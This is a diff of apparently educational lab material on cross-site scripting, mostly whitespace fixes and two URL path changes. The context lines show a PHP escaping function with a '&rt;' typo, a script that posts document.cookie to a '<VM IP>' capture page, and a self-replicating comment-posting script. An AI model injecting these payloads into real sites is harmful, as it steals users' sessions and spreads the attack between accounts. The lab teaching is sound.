@@ -18,12 +18,12 @@ Alternatively, this would also work in most cases:
 
   function prepareSearchTerms($terms) {
     $terms = ucwords($terms);  // Capitalise each word.
-    $terms = str_replace("<", "&lt;", $terms); 
+    $terms = str_replace("<", "&lt;", $terms);
     $terms = str_replace(">", "&rt;", $terms);
     return $terms;
   }
-  
-Note that the second solution given above does not protect in cases where 
+
+Note that the second solution given above does not protect in cases where
 the output is used as part of an attribute, e.g.:
 
 .. code:: html
@@ -31,7 +31,7 @@ the output is used as part of an attribute, e.g.:
   <h2 title="Results for <?= $search_term; ?>">
     ...
   </h2>
-  
+
 Could be exploited to output the following HTML:
 
 .. code:: php
@@ -45,7 +45,7 @@ Could be exploited to output the following HTML:
     ...
   </h2>
 
-  
+
 
 Using Javascript to steal the session ID
 ----------------------------------------
@@ -54,7 +54,7 @@ Using Javascript to steal the session ID
 
   <script>
     jQuery.post(
-      "http://<VM IP>:12344/?page=capture",
+      "http://<VM IP>:12344/index.php?page=capture",
       {
         "cookies": document.cookie
       }
@@ -77,7 +77,7 @@ Extension Challenge
 
   <script class="evil-script">
     jQuery.post(
-      "http://<VM IP>:12342/?page=comment.php",
+      "http://<VM IP>:12342/index.php?page=comment.php",
       {
         "article_id": 1,
         "body": jQuery(".evil-script").first().parent().html()
